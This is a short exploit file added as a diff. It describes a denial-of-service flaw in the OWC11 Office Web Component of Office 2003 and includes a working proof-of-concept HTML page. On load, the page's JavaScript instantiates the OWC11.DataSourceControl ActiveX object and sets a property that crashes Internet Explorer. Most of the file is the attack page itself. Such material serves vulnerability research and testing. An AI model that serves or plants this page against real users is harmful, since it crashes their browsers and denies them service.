@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/26405/info
+
+Microsoft Office Web Component is prone to a denial-of-service vulnerability because of a memory access violation.
+
+Attackers can exploit this issue to crash Internet Explorer and deny service to legitimate users.
+
+This issue affects OWC11 for Microsoft Office 2003. 
+
+<!--
+written by e.b.
+-->
+<html>
+<head>
+ <script language="JavaScript" DEFER>
+   function Check() {
+     var obj = new ActiveXObject("OWC11.DataSourceControl");
+     obj.XMLDataTarget = "A";
+ }
+</script>
+</head>
+<body onload="JavaScript: return Check();" />
+</html>
